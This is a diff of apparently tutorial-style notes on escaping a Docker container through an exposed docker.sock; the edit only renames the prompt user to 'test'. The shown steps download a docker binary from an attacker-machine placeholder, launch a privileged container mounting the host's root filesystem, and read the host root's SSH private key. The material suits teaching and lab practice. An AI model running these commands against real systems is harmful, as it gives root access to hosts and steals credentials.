@@ -37,10 +37,10 @@ A Docker socket or Docker daemon socket is a special file that allows us and pro
 Nevertheless, Docker sockets require appropriate permissions to ensure secure communication and prevent unauthorised access. Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon. By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios. However, depending on the configuration, there are many ways where automated processes or tasks can be stored. Those files can contain very useful information for us that we can use to escape the Docker container.
 
 ```shell-session
-cyberslut@container:~/app$ ls -al
+test@container:~/app$ ls -al
 
 total 8
-drwxr-xr-x 1 cyberslut cyberslut 4096 Jun 30 15:12 .
+drwxr-xr-x 1 test test 4096 Jun 30 15:12 .
 drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
 srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
 ```
@@ -48,14 +48,14 @@ srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
 From here on, we can use the `docker` to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.org/linux/x86_64/docker) and upload it to the Docker container.
 
 ```shell-session
-cyberslut@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
-cyberslut@container:/tmp$ chmod +x docker
-cyberslut@container:/tmp$ ls -l
+test@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
+test@container:/tmp$ chmod +x docker
+test@container:/tmp$ ls -l
 
--rwxr-xr-x 1 cyberslut cyberslut 0 Jun 30 15:27 docker
+-rwxr-xr-x 1 test test 0 Jun 30 15:27 docker
 
 
-cyberslut@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps
+test@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps
 
 CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
 3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
@@ -65,8 +65,8 @@ CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS     
 We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.
 
 ```shell-session
-cyberslut@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
-cyberslut@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
+test@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+test@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
 
 CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
 7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
@@ -77,7 +77,7 @@ CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS 
 Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.
 
 ```shell-session
-cyberslut@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
+test@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
 
 
 root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa
